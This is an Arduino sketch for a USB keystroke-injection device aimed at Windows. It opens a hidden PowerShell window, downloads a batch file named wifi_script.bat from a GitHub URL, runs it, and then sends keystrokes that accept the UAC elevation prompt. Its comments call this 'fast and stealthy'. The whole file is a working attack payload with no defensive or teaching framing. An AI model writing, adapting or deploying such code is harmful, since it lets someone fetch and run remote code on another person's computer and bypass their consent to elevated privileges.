#include <Keyboard.h>

void setup() {
  Keyboard.begin();
  delay(500);
  
  // Open Run dialog (Win+R) - Fast and stealthy
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(300);
  
  // Type powershell hidden command
  Keyboard.print("powershell -w hidden");
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(500);

  // Download and execute funny.bat file
  typeString("iwr -useb 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/wifi_script.bat' -OutFile $env:TEMP\\f.bat;start $env:TEMP\\f.bat;exit");
  delay(300);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  
  // Wait for UAC prompt and press Left arrow + Enter (to select "Yes")
  delay(2500);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.release(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  
  Keyboard.end();
}

// Fast typing with minimal delay
void typeString(const char* str) {
  while (*str) {
    Keyboard.write(*str);
    delay(5);  // Faster typing
    str++;
  }
}

void loop() {
  // Nothing to do here
}